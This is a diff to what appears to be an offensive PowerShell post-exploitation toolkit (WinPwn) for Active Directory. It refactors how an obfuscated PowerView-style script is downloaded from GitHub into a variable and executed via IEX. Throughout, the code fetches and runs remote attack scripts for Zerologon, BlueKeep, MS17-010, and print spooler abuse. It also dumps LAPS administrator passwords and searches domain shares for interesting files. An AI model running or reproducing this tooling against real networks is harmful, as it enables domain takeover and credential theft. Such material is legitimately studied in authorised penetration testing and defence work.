@@ -1848,7 +1848,6 @@ function Domainreconmodules
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
     @'
 
              
@@ -1866,6 +1865,7 @@ __        ___       ____
         reconAD
         generaldomaininfo -noninteractive 
         sharphound 
+        IEX($viewdevobfs)
         Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
         shareenumeration
         powerSQL -noninteractive
@@ -1884,6 +1884,7 @@ __        ___       ____
     elseif($noninteractive -and $consoleoutput)
     {
         generaldomaininfo -noninteractive -consoleoutput
+        IEX($viewdevobfs)
         Find-InterestingDomainShareFile
         shareenumeration -consoleoutput
         powerSQL -noninteractive -consoleoutput
@@ -1933,7 +1934,7 @@ __        ___       ____
              1{generaldomaininfo}
              2{reconAD}
              3{Sharphound}
-             4{Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
+             4{IEX($viewdevobfs);Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
              5{shareenumeration}
              6{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
              7{spoolvulnscan}
@@ -2053,7 +2054,7 @@ if(!$consoleoutput){
             condor 
         }catch{Write-Host "Got an error"}
         }
-	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+	IEX ($viewdevobfs)
     if(!$consoleoutput){breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt"}else{Write-Host -ForegroundColor Yellow "------->  DomainPrinters";breviaries -Printers} 	        
 	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/SPN-Scan.ps1')
 	if(!$consoleoutput){Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"}else{Write-Host -ForegroundColor Yellow "------->  InterestingSPNs";Discover-PSInterestingServices}
@@ -2327,7 +2328,7 @@ function Spoolvulnscan
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if (!$exploit)
     {   
-        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')         
+        IEX ($viewdevobfs)         
 	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
         iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
         $domcontrols = spinster
@@ -2548,7 +2549,7 @@ function Bluekeep
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/bluekeepscan.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    IEX ($viewdevobfs)
     $serversystems = "yes"
     if (!$noninteractive){$serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'}
     if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
@@ -2622,7 +2623,7 @@ function zerologon
     )
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')         
+    IEX ($viewdevobfs)         
 	Write-Host -ForegroundColor Yellow 'Searching for zerologon vulnerable Domain Controllers - if vulnerable you can pwn everything in 5 minutes.' 
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Zerologon.ps1')
     $domcontrols = spinster
@@ -2672,7 +2673,7 @@ function MS17-10
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ms17-10.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    IEX ($viewdevobfs)
     $serversystems = "yes"
     if(!$noninteractive)
     {
@@ -3479,7 +3480,7 @@ function groupsearch
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    iex ($viewdevobfs)
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
             {
@@ -3844,7 +3845,7 @@ function Lapschecks
 
     if ($passworddump)
     {
-        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+        IEX ($viewdevobfs)
         if(!$consoleoutput){breviaries -Properties DnsHostName,ms-Mcs-AdmPwd >> "$currentPath\Exploitation\LapsPasswords.txt"}else{Write "-------> Dumping LAPS passwords:";breviaries -Properties DnsHostName,ms-Mcs-AdmPwd}
     }
 
@@ -4093,5 +4094,5 @@ WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbel
    
 }
 
-
+$viewdevobfs = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
 $admodule = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')
